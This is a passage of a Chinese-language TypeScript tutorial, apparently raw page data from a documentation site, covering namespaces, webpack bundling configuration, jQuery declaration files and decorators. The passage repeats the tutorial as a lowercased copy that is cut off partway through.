}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nbox.ts\n\nimport { C } from './view'\nexport default class D {\n    constructor() {\n        new C();\n        console.log('D');\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nh.html\n\n<html>\n<head>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.js\"><\/script>\n    <script src=\"./dist/bundle.js\"><\/script>\n</head>\n<body>\n    <script>\n        require(['box'], function (box) {\n            new box.default();\n        });\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 使用webpack打包\n\n上一节使用的是\"module\": \"amd\"和\"outFile\": \"./dist/bundle.js\"再配合require.js来使用的，可以看到还要额外引入require.js会比较麻烦。\n\n可以使用webpack将ts项目编译打包，可以查看webpack的配置和一些用法。比如要将上面的改为webpack打包，配置会非常的麻烦，如下：\n\n 1. 首先安装webpack相关的东西：npm install --save-dev webpack@5.1.0，npm install --save-dev webpack-cli@3.3.12，npm install --save-dev typescript ts-loader，npm install --save-dev webpack-merge，npm install --save-dev html-webpack-plugin，npm install --save-dev clean-webpack-plugin，npm install --save-dev html-webpack-plugin，npm install --save-dev uglifyjs-webpack-plugin。\n\n 2. 上面的view.ts无需调整，box.ts需要在尾部加一个new D();，h.html要改名为index.html并且里面的script脚本全部删除。\n\n 3. 配置项使用生产环境与开发环境分离的模式，一下分别是webpack.common.js、webpack.dev.js、webpack.prod.js、package.json（部分）。\n    \n    const path = require('path');\n    const { CleanWebpackPlugin } = require('clean-webpack-plugin');\n    const HtmlWebpackPlugin = require('html-webpack-plugin');\n    \n    module.exports = {\n        entry: './src/box.ts', // 入口\n        output: {\n            filename: 'bundle.js', // 出口的文件名\n            path: path.resolve(__dirname, 'dist') // 处理输出位置\n        },\n        module: {\n            rules: [{ // 使用tsloader\n                test: /\\.tsx?$/,\n                use: 'ts-loader',\n                exclude: /node_modules/\n            }]\n        },\n        resolve: {\n            extensions: ['.tsx', '.ts', '.js']\n        },\n        plugins: [\n            new CleanWebpackPlugin({ // 打包生成dist前会自动删除dist下的文件，使用npm脚本“rm -rf ./dist”也可以\n                cleanOnceBeforeBuildPatterns: ['dist']\n            }),\n            new HtmlWebpackPlugin({ // 用于生成入口html（存于dist），然后会自动引入打包好的bundle.js\n                title: 'Production',\n                template: './index.html' // 模板，webpack生成html时用到的模板，比如模板里要挂载vue。\n            })\n        ]\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    \n    \n    const path = require('path');\n    const { merge } = require('webpack-merge');\n    const common = require('./webpack.common.js');\n    \n    module.exports = merge(common, {\n        devtool: 'inline-source-map',   // 开发环境所使用的SourceMap\n        devServer: { // webpack-dev-server\n            contentBase: path.resolve(__dirname, 'dist'), // 设置服务器访问的基本目录\n            host: 'localhost', // 服务器的ip地址\n            port: 8080, // 端口号\n            open: true // webpack运行服务器时自动打开页面\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n    \n    const merge = require('webpack-merge');\n    const UglifyJSPlugin = require('uglifyjs-webpack-plugin');\n    const common = require('./webpack.common.js');\n    \n    module.exports = merge(common, {\n        devtool: 'source-map', // 用于生产的SourceMap\n        plugins: [\n            // 代码混淆压缩，当然你也可以考虑使用BabelMinifyWebpackPlugin或ClosureCompilerPlugin\n            new UglifyJSPlugin({\n                sourceMap: true // 用于生产的SourceMap\n            }),\n            // 为项目设置环境变量，指定环境为生产环境，打包出的bundle会小很多。\n            // 也可以在package.json里加上--env.NODE_ENV=production，但是得把env传到webpack.prod.js里来，将对象改为函数\n            new webpack.DefinePlugin({\n                'process.env.NODE_ENV': JSON.stringify('production')\n            })\n        ]\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n    \n    \"scripts\": {\n        \"serve\": \"webpack-dev-server --open --config webpack.dev.js --mode development\",\n        \"build:dev\": \"webpack --open --config webpack.dev.js --mode development\",\n        \"build:pro\": \"webpack --config webpack.prod.js --mode production\"\n    },\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 编写*.d.ts文件\n\n在ts项目中引入一个js库，如果这个js库没有对应的ts声明文件，那在使用时就会报错，但是运行时是正确（前提是你真的写对了），也就说静态类型检测不通过但实际上运行没问题。在编写ts声明文件时，要对这个js库非常熟悉才能知道要声明成函数或者变量或者对象。\n\n\n# 声明全局函数\n\njQuery.js这个库在前端经常使用，最经典的就是$，它经常用于接受一个字符串返回一个对象，返回的对象包含各种方法。声明文件.d.ts*常用declare来声明js中提供的方法、变量等。\n\nindex.html\n\n<html>\n\n<head>\n    <script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.js\"><\/script>\n</head>\n\n<body>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\ndone.ts\n\n$(function () {\n    $('body').html('<div>666</div>');\n});\n\n\n1\n2\n3\n\n\njquery.d.ts\n\n// 声明一个全局函数$()，其入参也是一个函数\ndeclare function $(param: () => void): void;\n// 声明一个全局函数$()，入参是一个字符串，返回一个对象，这个对象有个html属性（方法）\ndeclare function $(selector: string): {\n    html: (param: string) => void;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 搭配使用interface\n\n使用jquery中的一些方法，基本都要返回一个页面元素，这个页面元素其实是个对象，比如html()，可以使用interface来约束这个元素对象。还可以对$本身使用interface，并用interface约束它的多种传值方式。\n\n// jquery对象（页面元素）\ninterface IjqueryDom {\n    html: (param: string) => IjqueryDom;\n}\n// $的几种用法，使用interface来约束\ninterface Ijquery {\n    (param: () => void): void;      // 第一种传值方式：递函数（立即运行）\n    (selector: string): IjqueryDom; // 第二种传值方式：传递字符串用于获取页面元素\n}\n// 声明一个全局变量$\ndeclare var $: Ijquery;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 声明对象和类\n\n在使用jquery可能会遇到$.fn.init();这种对象的对象的方法，可以搭配namespace来对对象进行声明，namespace中还能嵌套namespace\n\ndone.ts\n\n$(function () {\n    $('body').html('<div>666</div>');\n    $.fn.init();\n});\n\n\n1\n2\n3\n4\n\n\njquery.d.ts\n\n// 声明一个全局函数$()，其入参也是一个函数\ndeclare function $(param: () => void): void;\n// 声明一个全局函数$()，入参是一个字符串，返回一个对象，这个对象有个html属性（方法）\ndeclare function $(selector: string): IjqueryDom;\n// 声明一个对象，有个属性fn也是对象，fn有个属性是个方法\ndeclare namespace $ {\n    namespace fn {\n        function init(): IjqueryDom;\n    }\n}\n\n// jquery对象，有个html属性（方法）\ninterface IjqueryDom {\n    html: (param: string) => IjqueryDom;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# es6模块的声明文件\n\n去掉html中的<script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.js\"><\/script>，然后局部安装npm install jquery --save。\n\nes6模块方式使用jquery，那就是import $ from 'jquery';，但是这个jquery会报错“无法找到模块“jquery”的声明文件”，那么我们就需要对jquery这个es6模块进行声明文件的编写。\n\ndone.ts\n\nimport $ from 'jquery';\n$(function () {\n    $('body').html('<div>666</div>');\n    $.fn.init();\n});\n\n\n1\n2\n3\n4\n5\n\n\njquery.d.ts\n\n// 声明一个es6的模块\ndeclare module 'jquery' {\n    // jquery对象\n    interface IjqueryDom {\n        html: (param: string) => IjqueryDom;\n    }\n    // 这个模块中$是个方法\n    function $(param: () => void): void;\n    // 这个模块中$是个方法，重载\n    function $(selector: string): IjqueryDom;\n    // 这个模块中$还是个对象\n    namespace $ {\n        namespace fn {\n            function init(): IjqueryDom;\n        }\n    }\n    // 最后一定记得导出，而且都是export = xxx的形式\n    export = $;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 装饰器\n\n> 学习装饰器，必须清楚es5的构造函数与es6的类的联系。\n\n装饰器（Decorators）可以使用元编程的语法对类以及成员来进行监视、修改或替换。其实就是在类定义的时候，将类传到事先准备好的函数里，经过函数的运作，类就获得或者按照要求修改了一些东西。编译时动态修改了程序，这种方式叫做元编程。\n\n装饰器在ts中是一项实验性特性，要使用它得先打开它的相关配置。打开tsconfig.json文件，加上\"experimentalDecorators\": true和\"emitDecoratorMetadata\": true。\n\n装饰器的使用这样的，@expression，其中expression最后的求值结果必须是一个函数。如果对类进行了多个装饰器修饰，那么首先依次从上到下对装饰器表达式求值，然后求值的结果会被当作函数并从下到上依次调用。\n\nfunction f() {\n    console.log(1);\n    return function <T>(constructor: T) { console.log(2); }\n}\nfunction g() {\n    console.log(3);\n    return function <T>(constructor: T) { console.log(4); }\n}\n\n@f()\n@g()\nclass C { }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n上面就是装饰器的例子，打印顺序是1 3 4 2，f()和g()返回的函数会为C这个类作修饰。\n\n\n# 对类装饰\n\n对类使用装饰器，可以用来监视或修改类定义。在装饰器表达式里，类以构造函数形式作为其唯一的参数。装饰器表达式不返回值时，一般就是简单地往原型上添加内容；而如果是返回一个值，该值就是个匿名类并且会继承以前的类，也就是说匿名类会覆盖原类的同名属性和方法（包括constructor方法）。\n\n在ts中构造函数形式可以是new(...args: any[]) => {}，也可以是{ new(...args: any[]): {} }，当然最简单的是Function。具体在装饰器中使用构造函数形时，传入的具体类型各不相同，那么有必要使用泛型，也就是T extends new(...args: any[]) => {}。\n\n// constructor是个构造函数（其实就是Greeter），但不清楚具体类型得用泛型（不然ts静态检查过不了）\nfunction classDecorator<T extends new (...args: any[]) => {}>(constructor: T) {\n    // 返回这个class会以继承的方式覆盖原类的方法和属性（主要影响同名的，不同名的就相当于新加内容）\n    return class extends constructor {\n        public newProperty = \"new property\";\n        public hello = \"override\";\n    }\n}\n\n@classDecorator\nclass Greeter {\n    public property = \"property\";\n    public hello: string;\n    constructor(m: string) {\n        this.hello = m;\n    }\n}\nconsole.log(new Greeter(\"world\"));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面输出的结果{ property: 'property', hello: 'override', newProperty: 'new property' }，可能你会意外hello的值为什么是override而不是world，其实你需要补充一下es6的类知识了。在继承的派生类里没有明写constructor()方法时，其实是隐藏调用了。比如上面的代码其实是下面这样一个形式：\n\n// 部分代码，其他一样的省略\nreturn class extends constructor {\n    public newProperty = \"new property\";\n    public hello = \"override\";\n    constructor(...args: any[]) {\n        super(...args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n你再根据这段代码加上前面所说的装饰器修饰类时的规则就能明白hello为什么是override，首先public hello = \"override\"覆盖原有的public hello: string，然后constructor(...args: any[])覆盖原有的constructor(m: string)，也就是说new Greeter(\"world\")传进来的world是不会生效的。而如果改成下面的都就会生效（自己加上this.hello = args[0];）：\n\n// 部分代码，其他一样的省略\nreturn class extends constructor {\n    public newProperty = \"new property\";\n    public hello = \"override\";\n    constructor(...args: any[]) {\n        super(...args);\n        this.hello = args[0];\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 对方法装饰\n\n如果不需要对整个类进行装饰，可以考虑只对类的方法进行装饰。我们知道类里的方法，其实就是构造函数的原型上的方法（不理解的可以去看es6的类），那么对类的方法进行装饰，其实就是对原型对象的属性进行操作，是不是立马想到了Object.defineProperty，这个方法是操作目标对象的属性以及属性的特性。对类的方法进行装饰也是一样的，请看：\n\nclass Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n\n    @enumerable(false)\n    greet() {\n        return \"Hello, \" + this.greeting;\n    }\n}\n// 对类的方法设置为不可枚举的\nfunction enumerable(value: boolean) {\n    // target是原型对象，propertyKey是属性名，descriptor是特性，跟Object.defineProperty类似\n    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n        descriptor.enumerable = value;\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 对访问器装饰\n\n只需要私有属性的访问器进行装饰，写法与方法装饰器类似，只是descriptor不一样而已。但是要注意不允许同时装饰一个成员的get和set访问器，因为descriptor同时有这两个访问器。\n\nclass Point {\n    private _x: number;\n    private _y: number;\n    constructor(x: number, y: number) {\n        this._x = x;\n        this._y = y;\n    }\n\n    @configurable(false)\n    get x() { return this._x; }\n\n    @configurable(false)\n    get y() { return this._y; }\n}\nfunction configurable(value: boolean) {\n    // target是原型对象，propertyKey是属性名，descriptor是特性，跟Object.defineProperty类似\n    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n        descriptor.configurable = value;\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 对属性装饰\n\n我们知道普通方法和访问器都可以在原型对象上进行操作，但是类中的属性是属于实例化对象的（需要搞清楚es6的类），那么就不能像装饰方法一样使用原型对象上的属性的descriptor，而是自定义一个descriptor修改好后然后返回它，从而达到修改属性特性的目的。\n\nclass Test {\n    @propDescriptor(false)\n    property: string = \"name\";\n}\nfunction propDescriptor(value: boolean) {\n    // target是原型对象，propertyKey是属性名。注意，在target上不能操作实例属性\n    return function (target: any, propertyKey: string): any {\n        const descriptor: PropertyDescriptor = { writable: value };\n        return descriptor;\n    };\n}\nconst test = new Test();\ntest.property = \"test\"; // 报错，不能对只读的属性进行修改。这样就达到了目的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 对参数装饰\n\n对类的构造方法或普通方法里的参数进行装饰，装饰器函数接收三个值，第一个是构造函数（方法是静态的）或者原型（普通方法），第二个是参数所在的方法名、第三个就是参数在参数列表中位置的索引。\n\nclass Test {\n    func(name: string, @paramDescriptor(false) age: number) { }\n}\nfunction paramDescriptor(value: boolean) {\n    // target是构造函数（方法是静态的）或者原型（普通方法），propertyKey是参数所在的方法名，descriptor是参数在参数列表中位置的索引\n    return function (target: any, method: string, index: number): any {\n        console.log('index', index);\n    };\n}\nconst test = new Test();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 装饰器的小例子\n\n\nconst info: any = undefined;\nfunction catchDescriptor(msg: string) {\n    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n        const fun = descriptor.value;\n        // 用新函数包裹旧函数，并且统一做异常捕获处理\n        descriptor.value = function () {\n            try {\n                fun();\n            } catch (e) {\n                console.log(msg)\n            }\n        }\n    }\n}\nclass Task {\n    @catchDescriptor('info.name不存在')\n    getTaskName() {\n        return info.name;\n    }\n    @catchDescriptor('info.id不存在')\n    getTaskId() {\n        return info.id;\n    }\n}\nconst task = new Task();\ntask.getTaskId();\ntask.getTaskName();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n",normalizedContent:"# typescript进阶\n\n\n# 泛型\n\n泛型可以说一个泛指类型，在程序时并不清楚它具体是哪一个类型，这段程序被调用时才会给它指定具体类型。泛型定义时常使用<t>，当然使用<a>也可以；在泛型调用就得给它指定具体的类型比如<string>。\n\n\n# 泛型接口\n\n泛型接口中<t>常跟在接口名后面，一般调用处要指定具体类型。泛型可以一次使用多个，不止是泛型接口，下面的比如泛型类泛型函数等都可以使用多个泛型。\n\ninterface itask<t, p> {\n    name: t;\n    age: p;\n}\nconst task: itask<string, number> = { name: 'bob', age: 20 };\n\n\n1\n2\n3\n4\n5\n\n\n\n# 泛型类\n\n泛型类中<t>常跟在类名后面，一般调用处要指定具体类型。\n\nclass data<t> {\n    constructor(private _item: t) { }\n    get item(): t { return this._item; }\n}\nconst data: data<number> = new data<number>(0);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 泛型函数\n\n泛型函数中<t>常跟在函数名后面，一般调用处要指定具体类型。含有可以给一个变量类型注解为泛型函数，一般有两种，一种是花括号和冒号搭配，另一种是不用花括号而使用箭头函数。\n\nfunction fun<t>(v1: t, v2: t) {\n    console.log(`${v1}+${v2}`);\n}\nfun<string>('web', 'app');                     // 调用时加上<string>具体的限制类型\nconst func: { <t>(v1: t, v2: t): void } = fun; // 定义一个泛型函数\nconst func1: <t>(v1: t, v2: t) => void = fun;  // 定义一个泛型函数\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 泛型约束\n\n泛型还可以和extends搭配使用，表示该泛型受到约束\n\ninterface itest { name: string; }\nclass data<t extends itest> {\n    constructor(private _item: t) { }\n    get item(): t { return this._item; }\n}\nconst data = new data({ name: 'bob' });\n\n\n1\n2\n3\n4\n5\n6\n\n\n继承接口、类、基本类型都可以\n\n// 使用基本类型的联合类型来约束泛型\nclass data<t extends number | string> {\n    constructor(private _item: t) { }\n    get item(): t { return this._item; }\n}\nconst data: data<number | string> = new data('bob');\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 泛型中的keyof\n\n在程序中使用一个泛型，一般都是直接用它本身，但难免不会去操作它的属性，如果它属性的类型各不相同，在外部调用这段程序时ts可能就不会做具体的类型推断了。使用keyof可以分解一个复杂类型，获取它属性上的各种类型。\n\ninterface task {\n    num: number;\n    name: string;\n    desc: string;\n}\nclass accepttask {\n    constructor(private _task: task) { }\n    // 需要根据key去取_task的属性里，key对应的值，但是_task的属性的类型都不一样\n    // 所以可以使用keyof对task进行分解，key就可以拿到属性的各种可能的情况\n    public notify<t extends keyof task>(key: t): task[t] {\n        return this._task[key];\n    }\n}\nconst status = new accepttask({ num: 1001, name: 'task1', desc: 'xxx' });\nstatus.notify('name');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 命名空间\n\n\n# 命名空间声明\n\n命名空间（对应在es6里叫“内部模块”）可以将一些类或者函数等包裹起来，使用模块化的方式来组织代码，减少类或函数等在全局环境中暴露的机会。\n\n命名空间使用namespace来声明的，并且还可以和export搭配使用，可以让命名空间内的一部分内容让外部使用。\n\nview.ts\n\nnamespace viewspace {\n    class a { }\n    class b { }\n    export class c { // 将c暴露给命名空间之外，外部就可以使用taskspace.c了\n        constructor() {\n            new a();\n            new b();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 命名空间使用\n\n在一个namespace中调用另一个namespace，并且还要放在页面中，那么先使用tsc进行编译生成对应的js文件，然后每一个js文件都要用一个<script>存放，最后就可以在<script>中使用了。\n\nbox.ts\n\n///<reference path='./view.ts'>\nnamespace boxspace {\n    export class d {\n        constructor() {\n            new viewspace.c();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nh.html\n\n<html>\n    <head>\n        <script src=\"./dist/view.js\"><\/script>\n        <script src=\"./dist/box.js\"><\/script>\n    </head>\n    <body>\n        <script>\n            new boxspace.d();\n        <\/script>\n    </body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其实可以将编译文件生成在一起，先不考虑使用webpack，ts可以自己配置编译生成一个js。打开tsconfig.json，将module修改为amd，然后加上\"outfile\": \"./dist/bundle.js\"。这样就只引用bundle.js就可以了。\n\n注意：像以上命名空间相互引用的写法，最好要加上“声明”，例如///<reference path='./view.ts'>\n\n\n# 命名空间里再定义命名空间\n\n///<reference path='./view.ts'>\nnamespace boxspace {\n    export namespace buttonspace{ // 命名空间里再定义命名空间\n        export class e { }\n    }\n    export class d {\n        constructor() {\n            new viewspace.c();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# import\n\n\n# 配合require.js使用\n\n其实命名空间使用的不多，主要还是使用import方式。跟上一节样，先不考虑使用webpack，还是使用\"module\": \"amd\"和\"outfile\": \"./dist/bundle.js\"，但在页面使用时会有问题define识别不了，得引require.js进来（用cdn形式）。然后在脚本中使用require的方式实例化d，代码示例如下：\n\nview.ts\n\nclass a { }\nclass b { }\nexport class c {\n    constructor() {\n        new a();\n        new b();\n        console.log('c');\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nbox.ts\n\nimport { c } from './view'\nexport default class d {\n    constructor() {\n        new c();\n        console.log('d');\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nh.html\n\n<html>\n<head>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.js\"><\/script>\n    <script src=\"./dist/bundle.js\"><\/script>\n</head>\n<body>\n    <script>\n        require(['box'], function (box) {\n            new box.default();\n        });\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 使用webpack打包\n\n上一节使用的是\"module\": \"amd\"和\"outfile\": \"./dist/bundle.js\"再配合require.js来使用的，可以看到还要额外引入require.js会比较麻烦。\n\n可以使用webpack将ts项目编译打包，可以查看webpack的配置和一些用法。比如要将上面的改为webpack打包，配置会非常的麻烦，如下：\n\n 1. 首先安装webpack相关的东西：npm install --save-dev webpack@5.1.0，npm install --save-dev webpack-cli@3.3.12，npm install --save-dev typescript ts-loader，npm install --save-dev webpack-merge，npm install --save-dev html-webpack-plugin，npm install --save-dev clean-webpack-plugin，npm install --save-dev html-webpack-plugin，npm install --save-dev uglifyjs-webpack-plugin。\n\n 2. 上面的view.ts无需调整，box.ts需要在尾部加一个new d();，h.html要改名为index.html并且里面的script脚本全部删除。\n\n 3. 配置项使用生产环境与开发环境分离的模式，一下分别是webpack.common.js、webpack.dev.js、webpack.prod.js、package.json（部分）。\n    \n    const path = require('path');\n    const { cleanwebpackplugin } = require('clean-webpack-plugin');\n    const htmlwebpackplugin = require('html-webpack-plugin');\n    \n    module.exports = {\n        entry: './src/box.ts', // 入口\n        output: {\n            filename: 'bundle.js', // 出口的文件名\n            path: path.resolve(__dirname, 'dist') // 处理输出位置\n        },\n        module: {\n            rules: [{ // 使用tsloader\n                test: /\\.tsx?$/,\n                use: 'ts-loader',\n                exclude: /node_modules/\n            }]\n        },\n        resolve: {\n            extensions: ['.tsx', '.ts', '.js']\n        },\n        plugins: [\n            new cleanwebpackplugin({ // 打包生成dist前会自动删除dist下的文件，使用npm脚本“rm -rf ./dist”也可以\n                cleanoncebeforebuildpatterns: ['dist']\n            }),\n            new htmlwebpackplugin({ // 用于生成入口html（存于dist），然后会自动引入打包好的bundle.js\n                title: 'production',\n                template: './index.html' // 模板，webpack生成html时用到的模板，比如模板里要挂载vue。\n            })\n        ]\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    \n    \n    const path = require('path');\n    const { merge } = require('webpack-merge');\n    const common = require('./webpack.common.js');\n    \n    module.exports = merge(common, {\n        devtool: 'inline-source-map',   // 开发环境所使用的sourcemap\n        devserver: { // webpack-dev-server\n            contentbase: path.resolve(__dirname, 'dist'), // 设置服务器访问的基本目录\n            host: 'localhost', // 服务器的ip地址\n            port: 8080, // 端口号\n            open: true // webpack运行服务器时自动打开页面\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n    \n    const merge = require('webpack-merge');\n    const uglifyjsplugin = require('uglifyjs-webpack-plugin');\n    const common = require('./webpack.common.js');\n    \n    module.exports = merge(common, {\n        devtool: 'source-map', // 用于生产的sourcemap\n        plugins: [\n            // 代码混淆压缩，当然你也可以考虑使用babelminifywebpackplugin或closurecompilerplugin\n            new uglifyjsplugin({\n                sourcemap: true // 用于生产的sourcemap\n            }),\n            // 为项目设置环境变量，指定环境为生产环境，打包出的bundle会小很多。\n            // 也可以在package.json里加上--env.node_env=production，但是得把env传到webpack.prod.js里来，将对象改为函数\n            new webpack.defineplugin({\n                'process.env.node_env': json.stringify('production')\n            })\n        ]\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n    \n    \"scripts\": {\n        \"serve\": \"webpack-dev-server --open --config webpack.dev.js --mode development\",\n        \"build:dev\": \"webpack --open --config webpack.dev.js --mode development\",\n        \"build:pro\": \"webpack --config webpack.prod.js --mode production\"\n    },\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 编写*.d.ts文件\n\n在ts项目中引入一个js库，如果这个js库没有对应的ts声明文件，那在使用时就会报错，但是运行时是正确（前提是你真的写对了），也就说静态类型检测不通过但实际上运行没问题。在编写ts声明文件时，要对这个js库非常熟悉才能知道要声明成函数或者变量或者对象。\n\n\n# 声明全局函数\n\njquery.js这个库在前端经常使用，最经典的就是$，它经常用于接受一个字符串返回一个对象，返回的对象包含各种方法。声明文件.d.ts*常用declare来声明js中提供的方法、变量等。\n\nindex.html\n\n<html>\n\n<head>\n    <script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.js\"><\/script>\n</head>\n\n<body>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\ndone.ts\n\n$(function () {\n    $('body').html('<div>666</div>');\n});\n\n\n1\n2\n3\n\n\njquery.d.ts\n\n// 声明一个全局函数$()，其入参也是一个函数\ndeclare function $(param: () => void): void;\n// 声明一个全局函数$()，入参是一个字符串，返回一个对象，这个对象有个html属性（方法）\ndeclare function $(selector: string): {\n    html: (param: string) => void;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 搭配使用interface\n\n使用jquery中的一些方法，基本都要返回一个页面元素，这个页面元素其实是个对象，比如html()，可以使用interface来约束这个元素对象。还可以对$本身使用interface，并用interface约束它的多种传值方式。\n\n// jquery对象（页面元素）\ninterface ijquerydom {\n    html: (param: string) => ijquerydom;\n}\n// $的几种用法，使用interface来约束\ninterface ijquery {\n    (param: () => void): void;      // 第一种传值方式：递函数（立即运行）\n    (selector: string): ijquerydom; // 第二种传值方式：传递字符串用于获取页面元素\n}\n// 声明一个全局变量$\ndeclare var $: ijquery;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 声明对象和类\n\n在使用jquery可能会遇到$.fn.init();这种对象的对象的方法，可以搭配namespace来对对象进行声明，namespace中还能嵌套namespace\n\ndone.ts\n\n$(function () {\n    $('body').html('<div>666</div>');\n    $.fn.init();\n});\n\n\n1\n2\n3\n4\n\n\njquery.d.ts\n\n// 声明一个全局函数$()，其入参也是一个函数\ndeclare function $(param: () => void): void;\n// 声明一个全局函数$()，入参是一个字符串，返回一个对象，这个对象有个html属性（方法）\ndeclare function $(selector: string): ijquerydom;\n// 声明一个对象，有个属性fn也是对象，fn有个属性是个方法\ndeclare namespace $ {\n    namespace fn {\n        function init(): ijquerydom;\n    }\n}\n\n// jquery对象，有个html属性（方法）\ninterface ijquerydom {\n    html: (param: string) => ijquerydom;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# es6模块的声明文件\n\n去掉html中的<script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.js\"><\/script>，然后局部安装npm install jquery --save。\n\nes6模块方式使用jquery，那就是import $ from 'jquery';，但是这个jquery会报错“无法找到模块“jquery”的声明文件”，那么我们就需要对jquery这个es6模块进行声明文件的编写。\n\ndone.ts\n\nimport $ from 'jquery';\n$(function () {\n    $('body').html('<div>666</div>');\n    $.fn.init();\n});\n\n\n1\n2\n3\n4\n5\n\n\njquery.d.ts\n\n// 声明一个es6的模块\ndeclare module 'jquery' {\n    // jquery对象\n    interface ijquerydom {\n        html: (param: string) => ijquerydom;\n    }\n    // 这个模块中$是个方法\n    function $(param: () => void): void;\n    // 这个模块中$是个方法，重载\n    function $(selector: string): ijquerydom;\n    // 这个模块中$还是个对象\n    namespace $ {\n        namespace fn {\n            function init(): ijquerydom;\n        }\n    }\n    // 最后一定记得导出，而且都是export = xxx的形式\n    export = $;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 装饰器\n\n> 学习装饰器，必须清楚es5的构造函数与es6的类的联系。\n\n装饰器（decorators）可以使用元编程的语法对类以及成员来进行监视、修改或替换。其实就是在类定义的时候，将类传到事先准备好的函数里，经过函数的运作，类就获得或者按照要求修改了一些东西。编译时动态修改了程序，这种方式叫做元编程。\n\n装饰器在ts中是一项实验性特性，要使用它得先打开它的相关配置。打开tsconfig.json文件，加上\"experimentaldecorators\": true和\"emitdecoratormetadata\": true。\n\n装饰器的使用这样的，@expression，其中expression最后的求值结果必须是一个函数。如果对类进行了多个装饰器修饰，那么首先依次从上到下对装饰器表达式求值，然后求值的结果会被当作函数并从下到上依次调用。\n\nfunction f() {\n    console.log(1);\n    return function <t>(constructor: t) { console.log(2); }\n}\nfunction g() {\n    console.log(3);\n    return function <t>(constructor: t) { console.log(4); }\n}\n\n@f()\n@g()\nclass c { 